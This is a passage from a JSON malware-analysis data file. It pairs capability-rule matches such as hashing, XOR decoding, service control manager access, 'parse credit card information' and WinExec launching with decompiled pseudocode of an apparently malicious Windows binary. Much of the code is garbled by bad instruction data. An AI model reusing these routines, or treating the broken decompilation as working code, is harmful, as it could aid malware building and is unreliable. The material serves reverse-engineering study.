        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404a16) overlaps instruction at (ram,0x00404a15)\n// \n\nbool fcn.004049a0(void)\n\n{\n    uchar uVar1;\n    char cVar2;\n    char cVar3;\n    int32_t iVar4;\n    uchar *extraout_ECX;\n    uchar *puVar5;\n    uchar uVar6;\n    uint32_t unaff_EBX;\n    uint *puVar7;\n    uchar *unaff_EDI;\n    uint *puVar8;\n    uchar uVar9;\n    uchar uVar10;\n    bool bVar11;\n    uint64_t uVar12;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uint var_1fh;\n    \n    iVar4 = fcn.004045f0();\n    if (iVar4 == 0) {\n        fcn.00404b40();\n        return false;\n    }\n    uVar9 = 0;\n    bVar11 = false;\n    uVar10 = iVar4 == -0x36;\n    uVar12 = fcn.004026f0();\n    puVar7 = &stack0xfffffffc;\n    puVar8 = &stack0xfffffffc;\n    if (!bVar11) {\n        while( true ) {\n            uVar6 = uVar12 >> 0x20;\n            puVar8 = puVar7;\n            if (!bVar11) break;\n            uVar1 = in(uVar12 >> 0x20);\n            *unaff_EDI = uVar1;\n            if (!uVar9 && !uVar10) {\n                *uVar12 = *uVar12 + uVar12;\n                puVar5 = extraout_ECX;\n                goto code_r0x00404a83;\n            }\n            unaff_EBX = unaff_EBX & 0xffff0000 | CONCAT11(*extraout_ECX, 0xbc);\n            cVar3 = extraout_ECX >> 8;\n            bVar11 = SCARRY1(cVar3, 'h');\n            cVar3 = cVar3 + 'h';\n            uVar10 = cVar3 == '\\0';\n            puVar8 = &stack0xffffff68;\n            cVar2 = '\\x02';\n            do {\n                puVar7 = puVar7 + -1;\n                puVar8 = puVar8 + -1;\n                *puVar8 = *puVar7;\n                cVar2 = cVar2 + -1;\n            } while ('\\0' < cVar2);\n            uVar9 = false;\n            uVar12 = uVar12 & 0xffff00000000 | CONCAT31(*(unaff_EBX + CONCAT31(0x4105ac, cVar3) * 4) >> 8, *0xe8004105);\n            puVar7 = &stack0xffffff68;\n            unaff_EDI = unaff_EDI + 1;\n            if (!uVar10 && bVar11 == cVar3 < '\\0') {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n        }\n    }\n    puVar7 = puVar8;\n    iVar4 = fcn.004012b0(0x4105ac);\n    if (iVar4 != -1) {\n        iVar4 = fcn.004012b0(0x4105a0);\n        if (iVar4 == -1) {\n            fcn.00404b40();\n        }\n        return false;\n    }\n    fcn.004036c0();\n    iVar4 = fcn.00403d80();\n    if (iVar4 != 0) {\n        return false;\n    }\n    uVar6 = 0;\n    puVar5 = 0x7;\ncode_r0x00404a83:\n    *(puVar7 + -8) = uVar6;\n    *(puVar7 + -0x20) = uVar6;\n    puVar8 = puVar7 + -0x1f;\n    for (; puVar5 != NULL; puVar5 = puVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    *(puVar7 + -0x18) = uVar6;\n    puVar8 = puVar7 + -0x7f;\n    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    *(puVar7 + -0x10) = uVar6;\n    puVar8 = puVar7 + -0x5f;\n    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    puVar8 = puVar7 + -0x3f;\n    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    iVar4 = fcn.00401f30(puVar7 + -0x20, puVar7 + -0x18, puVar7 + -8, puVar7 + -0x10);\n    if (iVar4 == 0) {\n        return false;\n    }\n    iVar4 = fcn.00404680(puVar7 + -8);\n    if (iVar4 == 0) {\n        return false;\n    }\n    iVar4 = fcn.00401b00(puVar7 + -0x20, puVar7 + -0x18);\n    return iVar4 != 0;\n}\n",
        "token_count": 1377
    },
    "00401850": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401850(uint lptstrFilename, uint s)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint var_1ah;\n    uint var_16h;\n    uint dwLen;\n    uint puLen;\n    int32_t lplpBuffer;\n    uint lpdwHandle;\n    \n    lpdwHandle = 0;\n    iVar1 = sub.VERSION.dll_GetFileVersionInfoSizeA(lptstrFilename, &lpdwHandle);\n    if (iVar1 != 0) {\n        puLen = 0;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(2, iVar1);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GlobalLock)(uVar2);\n        sub.VERSION.dll_GetFileVersionInfoA(lptstrFilename, lpdwHandle, iVar1, uVar3);\n        sub.VERSION.dll_VerQueryValueA(uVar3, 0x410540, &lplpBuffer, &puLen);\n        (*_sym.imp.MSVCRT.dll_sprintf)\n                  (s, 0x410a18, *(lplpBuffer + 0x10) >> 0x10, *(lplpBuffer + 0x10), *(lplpBuffer + 0x14) >> 0x10, \n                   *(lplpBuffer + 0x14));\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(uVar2);\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(uVar2);\n    }\n    return 1;\n}\n",
        "token_count": 345
    },
    "00402e60": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402f97) overlaps instruction at (ram,0x00402f96)\n// \n// WARNING: Control flow encountered bad instruction data\n\nuint * __cdecl fcn.00402e60(uint8_t *arg_8h, int32_t arg_ch, uint *arg_10h, int32_t *arg_14h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    char **ppcVar3;\n    uint8_t uVar4;\n    code *pcVar5;\n    uint8_t uVar6;\n    uint32_t in_EAX;\n    uint32_t uVar7;\n    uint *puVar8;\n    char *pcVar9;\n    uint32_t uVar10;\n    ushort in_DX;\n    ushort uVar11;\n    int32_t unaff_EBX;\n    uint8_t *puVar12;\n    uint32_t unaff_ESI;\n    uint32_t uVar13;\n    uint32_t unaff_EDI;\n    ushort in_SS;\n    uchar in_CF;\n    bool bVar14;\n    bool bVar15;\n    uint8_t in_AF;\n    bool in_ZF;\n    uchar uVar16;\n    bool bVar17;\n    unkuint6 Var18;\n    unkbyte3 Stack16;\n    uint8_t uStack13;\n    \n    Var18 = CONCAT24(in_DX, unaff_EDI);\n    Stack16 = unaff_EDI;\n    uStack13 = unaff_EDI >> 0x18;\n    uVar6 = uStack13;\n    if ((in_ZF) || (!in_ZF)) {\ncode_r0x00402e7a:\n        Var18 = fcn.004029d0(0, arg_8h, arg_ch + 1U >> 1 & 0xffffff | (arg_ch + 1U >> 0x19) << 0x18);\n        unaff_ESI = Var18 & 0xffff;\n        in_CF = 0;\n        uVar16 = (Var18 & 0xffff) == 0;\n        puVar12 = arg_8h;\n        if ((uVar16) || (!uVar16)) {\n            Var18 = (*_sym.imp.dbghelp.dll_ImageNtHeader)(arg_8h);\n        }\n        else {\n            uVar2 = in(Var18 >> 0x20);\n            *(unaff_EDI & 0xffffff | uVar6 << 0x18) = uVar2;\n            if (&Stack16 < 1) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            uVar7 = Var18 ^ 0xdee0ed6d;\n            uVar7 = uVar7 & 0xffff0000 | uVar7 + (uVar7 >> 8) * -0x31;\n            arg_8h[-1] = arg_8h[-1] ^ Var18 >> 0x20;\n            in_CF = 0xffbfaeb7 < uVar7;\n            Var18 = Var18 & 0xffff00000000 | ZEXT46(sym.imp.dbghelp.dll_ImageNtHeader + uVar7);\n            uVar16 = sym.imp.dbghelp.dll_ImageNtHeader + uVar7 == NULL;\n        }\n    }\n    else {\n        puVar12 = unaff_EBX + 1;\n        uVar16 = puVar12 == NULL;\n        if (!in_CF && !uVar16) {\n            uVar4 = 9 < (in_EAX & 0xf) | in_AF;\n            piVar1 = (in_EAX & 0xffff0000 | CONCAT11((in_EAX >> 8) + uVar4, in_EAX + uVar4 * '\\x06') & 0xff0f) + 0x2a;\n            *piVar1 = *piVar1 - puVar12;\n            goto code_r0x00402e7a;\n        }\n    }\n    uVar11 = Var18 >> 0x20;\n    puVar8 = Var18;\n    uVar7 = puVar8[0x16];\n    if ((in_CF || uVar16) || (!in_CF && !uVar16)) {\n        bVar14 = unaff_ESI < uVar7;\n        bVar17 = unaff_ESI == uVar7;\n    }\n    else {\n        uVar7 = uVar7 & 0xffff0000 | CONCAT11((uVar7 >> 8) - *puVar12, uVar7);\n        *(puVar8 + 0x66) = *(puVar8 + 0x66) - &stack0xffffffef;\n        bVar14 = unaff_ESI < uVar7;\n        bVar17 = unaff_ESI == uVar7;\n    }\n    if (bVar14) {\n        if ((bVar17) || (!bVar17)) {\n            uVar13 = (unaff_ESI - uVar7 & 0xffff) - 1;\n            goto code_r0x00402f14;\n        }\ncode_r0x00402eff:\n        uVar2 = in(uVar11);\n        *puVar8 = uVar2;\n        puVar8 = puVar8 + 1;\n        if (0 < &stack0xffffffef) {\n            *puVar12 = *puVar12 ^ uVar7 >> 8;\n            pcVar5 = swi(1);\n            puVar8 = (*pcVar5)();\n            return puVar8;\n        }\n    }\n    else {\n        uVar13 = unaff_ESI - (uVar7 & 0xffff);\ncode_r0x00402f14:\n        uVar10 = uVar7 >> 0x10;\n        bVar14 = uVar13 < uVar7 >> 0x10;\n        if (bVar14) {\n            uVar7 = uVar13 - uVar10 & 0xffff;\n            bVar17 = SBORROW4(uVar7, 1);\n            unaff_ESI = uVar7 - 1;\n        }\n        else {\n            bVar17 = SBORROW4(uVar13, uVar10);\n            unaff_ESI = uVar13 - uVar10;\n        }\n        bVar15 = (POPCOUNT(unaff_ESI & 0xff) & 1U) == 0;\n        if ((!bVar15) && (bVar15)) {\n            ppcVar3 = segment(in_SS, *0x10 + -0x11);\n            pcVar9 = *ppcVar3;\n            uVar11 = 0x9ea5;\n            if (!bVar14 && uVar13 < uVar10) {\n                pcVar5 = swi(4);\n                if (bVar17 == true) {\n                    (*pcVar5)();\n                }\n                goto code_r0x00402f98;\n            }\n            if (bVar15) {\n                *pcVar9 = *pcVar9 + pcVar9;\n                uVar7 = uVar10;\n                goto code_r0x00402eff;\n            }\n        }\n    }\n    *arg_14h = unaff_ESI + arg_ch;\ncode_r0x00402f98:\n    *arg_10h = puVar8[0x16];\n    return puVar8;\n}\n",
        "token_count": 1602
    },
    "00401df0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401ebd)\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00401df0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_10h._0_1_ = arg_14h * '\\x02';\n    var_ch = 0;\n    if (0 < arg_14h) {\n        var_8h = 1;\n        do {\n            uVar1 = *(var_8h % arg_ch + arg_8h);\n            *(arg_18h + -1 + var_8h) = var_10h ^ *(var_ch + arg_10h) ^ *((var_8h + -1) % arg_ch + arg_8h);\n            *(var_8h + arg_18h) = var_10h ^ uVar1;\n            var_8h = var_8h + 2;\n            var_ch = var_ch + 1;\n        } while (var_ch < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 328
    },
    "00401f30": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401f99) overlaps instruction at (ram,0x00401f95)\n// \n\nbool __cdecl fcn.00401f30(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    char cVar5;\n    char cVar6;\n    unkbyte10 extraout_ST0;\n    ulong uVar7;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lpBuffer = 0;\n    puVar4 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    var_8h = 0;\n    *(puVar4 + 2) = 0;\n    cVar6 = '\\0';\n    cVar5 = '\\0';\n    uVar7 = fcn.004026a0();\n    piVar3 = uVar7 >> 0x20;\n    if ((cVar6 == cVar5) && (cVar6 != cVar5)) {\n        *(uVar7 + -0x7ce92414) = extraout_ST0;\n        *piVar3 = *piVar3 + -0x7a72207c;\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00401420();\n        arg_ch_01 = fcn.00401420();\n        arg_ch_02 = fcn.00401420();\n        fcn.00402a60(arg_10h, arg_ch_00);\n        fcn.00402a60(arg_8h, arg_ch_01);\n        fcn.00402a60(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x41055c, &lpBuffer, arg_10h);\n        iVar2 = fcn.00402640(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x410568, &lpBuffer, arg_8h);\n            iVar2 = fcn.00402640(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x410568, &lpBuffer, arg_ch);\n                iVar2 = fcn.00402640(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00402a60(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 796
    },
    "00402d10": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402d10(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint uVar1;\n    \n    arg_8h_00 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    fcn.00402df0(arg_8h_00, arg_8h);\n    uVar1 = fcn.00402d90(arg_8h_00, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(arg_8h_00);\n    return uVar1;\n}\n",
        "token_count": 146
    },
    "00402350": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint32_t fcn.00402350(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint auStack24 [4];\n    uint uStack8;\n    uint uStack4;\n    \n    (*_sym.imp.MSVCRT.dll__strlwr)(param_1);\n    pcVar1 = _sym.imp.SHLWAPI.dll_StrStrA;\n    auStack24[0] = 0x41080c;\n    auStack24[1] = 0x410818;\n    auStack24[2] = 0x410824;\n    auStack24[3] = 0x41082c;\n    uStack8 = 0x410838;\n    uStack4 = 0x410844;\n    uVar3 = 0;\n    puVar4 = auStack24;\n    do {\n        iVar2 = (*pcVar1)(param_1, *puVar4);\n        if (iVar2 != 0) {\n            return uVar3;\n        }\n        uVar3 = uVar3 + 1;\n        puVar4 = puVar4 + 1;\n    } while (uVar3 < 6);\n    return 0xffffffff;\n}\n",
        "token_count": 280
    },
    "00403b80": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00403b80(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00402a60(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x41097c, acStack1304, &uStack2112);\n    uStack2088 = 0x410a34;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x410a4c;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.004017b0(auStack1564, 0x410978, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1849
    },
    "00402ca0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00402ca0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    if (arg_ch == 1) {\n        fcn.00402fb0();\n        fcn.004049a0();\n        if (*0x420a94 == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.00403b80();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 154
    },
    "00403e20": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403fb4) overlaps instruction at (ram,0x00403fb3)\n// \n// WARNING: Removing unreachable block (ram,0x00403e7c)\n// WARNING: Removing unreachable block (ram,0x00403edb)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint64_t __fastcall fcn.00403e20(int16_t param_1, int32_t *param_2, uint32_t *param_3)\n\n{\n    uint *puVar1;\n    int32_t **ppiVar2;\n    uint8_t uVar3;\n    uint32_t in_EAX;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    int32_t *piVar6;\n    uint32_t *puVar7;\n    uint extraout_EDX;\n    char unaff_BL;\n    uchar *puVar8;\n    uchar *puVar9;\n    uint32_t unaff_ESI;\n    uint16_t unaff_DI;\n    ushort in_SS;\n    bool bVar10;\n    bool bVar11;\n    uint64_t uVar12;\n    ushort uStack22;\n    ushort uStack18;\n    \n    puVar8 = &stack0xfffffffc;\n    bVar10 = (POPCOUNT((param_1 - 1U & unaff_DI | 0x61be) & 0xff) & 1U) == 0;\n    *param_3 = 4;\n    if ((!bVar10) && (bVar10)) {\n        puVar1 = segment(in_SS, *0x10 + -0x10);\n        param_2 = 0xb7bc9ea5;\n        if (bVar10) {\n            uVar12 = (*_sym.imp.USER32.dll_CreateWindowExA)(0, 0x544, 0xa80);\n            if (uVar12 == 0) {\n                return uVar12 & 0xffffffff00000000;\n            }\n            (*_sym.imp.USER32.dll_ShowWindow)(uVar12, 0);\n            return CONCAT44(extraout_EDX, 1);\n        }\n        in_EAX = *puVar1;\n    }\n    *(param_3 + 1) = 0x84;\n    piVar6 = (in_EAX >> 8 & 0xffff00) << 8 | in_EAX & 0xffff;\n    *(param_3 + 2) = 9;\n    uStack22 = in_EAX & 0xffff;\n    *(param_3 + 3) = 0x9a;\n    *(param_3 + 1) = 0xf8;\n    *(param_3 + 5) = 0x59;\n    bVar11 = (param_2 & 0x1200) == 0;\n    bVar10 = (POPCOUNT(param_2 >> 8 & 0x12) & 1U) == 0;\n    *(param_3 + 6) = 0xb7;\n    piVar5 = piVar6;\n    puVar7 = param_3;\n    puVar9 = &stack0xfffffffc;\n    if (bVar11) goto code_r0x00403ec5;\n    do {\n        piVar5 = piVar6;\n        puVar9 = puVar8;\n        if (bVar11) {\n            piVar5 = piVar6 & 0xe2f4cc58;\n            bVar10 = (POPCOUNT(piVar6 & 0x58) & 1U) == 0;\n        }\ncode_r0x00403ec5:\n        *(puVar7 + 7) = 0x48;\n        uStack18 = SUB42(puVar7, 0);\n        *(puVar7 + 2) = 1;\n        if ((bVar10) || (uStack18 = param_3 >> 0x10,  uStack22 = param_3,  !bVar10)) {\n            *(puVar7 + 9) = 0x44;\n            piVar6 = piVar5;\n            if (bVar10) goto code_r0x00403f2a;\n        }\n        else {\n            unaff_ESI = 0x34a96cf4;\n            piVar6 = param_2 + 1;\n            puVar9 = *0xc617b43a;\n            puVar7 = puVar7 + 1;\n            *(param_3 + -0x76 + puVar7) = *(param_3 + -0x76 + puVar7) | piVar6;\n            *piVar6 = *piVar6 - piVar6;\n            *piVar6 = *piVar6 + piVar6;\n            bVar10 = (POPCOUNT(*piVar6) & 1U) == 0;\n            param_2 = piVar5;\n        }\n        piVar5 = piVar6;\n        uVar4 = unaff_ESI;\n        if (!bVar10) goto code_r0x00403f2a;\n        while( true ) {\n            unaff_ESI = *param_3;\n            *param_3 = uVar4;\n            puVar9 = puVar9 + -*(puVar9 + 0x5f9dff63);\n            if (puVar9 < 0) break;\n            bVar10 = false;\n            bVar11 = (POPCOUNT(unaff_ESI & 0xff) & 1U) == 0;\n            piVar5 = piVar6;\n            if (unaff_ESI < 0) {\ncode_r0x00403f2a:\n                *(puVar7 + 10) = 0x26;\n                uStack22 = SUB42(piVar5, 0);\n                uStack18 = piVar5 >> 0x10;\n                *(puVar7 + 0xb) = 0xb5;\n                if ((0x51 < param_2) && (param_2 < 0x52)) {\n                    do {\n    // WARNING: Do nothing block with infinite loop\n                    } while( true );\n                }\n                *(puVar7 + 3) = 0xd9;\n                piVar5 = puVar7 & 0xffff0000 | CONCAT11((puVar7 >> 8) - unaff_BL, puVar7);\n                bVar10 = piVar5 < param_2;\n                bVar11 = (POPCOUNT(piVar5 - param_2 & 0xff) & 1U) == 0;\n                unaff_ESI = *(puVar9 + 8);\n                *(unaff_ESI + 0xd) = 0xa8;\n                if ((bVar11) || (!bVar11)) goto code_r0x00403f93;\n            }\n            ppiVar2 = segment(in_SS, *0x10 + -0x10);\n            piVar6 = *ppiVar2;\n            param_2 = 0xb7bc9ea5;\n            if (bVar10) {\n                param_2 = CONCAT22(uStack18, uStack22);\n                goto code_r0x00403f93;\n            }\n            uVar4 = unaff_ESI;\n            if (!bVar11) {\ncode_r0x00403f93:\n                *(unaff_ESI + 0xe) = 0x78;\n                *(unaff_ESI + 0xf) = 0x82;\n                puVar1 = *(puVar9 + 0xc);\n                *puVar1 = 0x10;\n                return CONCAT44(param_2, puVar1);\n            }\n        }\n        uVar4 = piVar6 + -0x157f9fa7 ^ *(piVar6 + 0x75e1733f);\n        puVar8 = puVar9 + -1;\n        uVar3 = uVar4;\n        param_2 = param_2 & 0xffff0000 | CONCAT11(param_2 >> 8 | uVar3, param_2);\n        puVar7 = puVar7 + 1;\n        uVar3 = uVar3 | 0x66;\n        piVar6 = uVar4 | 0x66;\n        bVar11 = uVar3 == 0;\n        bVar10 = (POPCOUNT(uVar3) & 1U) == 0;\n    } while( true );\n}\n",
        "token_count": 1836
    },
    "00404080": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00404080(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t in_ECX;\n    bool bVar2;\n    bool bVar3;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    bVar3 = false;\n    bVar2 = arg_14h == 0;\n    var_8h = 0;\n    uVar1 = arg_14h;\n    if (!bVar2) {\n        do {\n            if ((!bVar2 && bVar3 == uVar1 < 0) && (bVar2 || bVar3 != uVar1 < 0)) {\n                if (in_ECX == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            *(var_8h + arg_10h) = *(var_8h + arg_10h) ^ *(var_8h % arg_ch + arg_8h);\n            var_8h = var_8h + 1;\n            bVar3 = SBORROW4(var_8h, arg_14h);\n            uVar1 = var_8h - arg_14h;\n            bVar2 = uVar1 == 0;\n            in_ECX = arg_14h;\n        } while (var_8h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 396
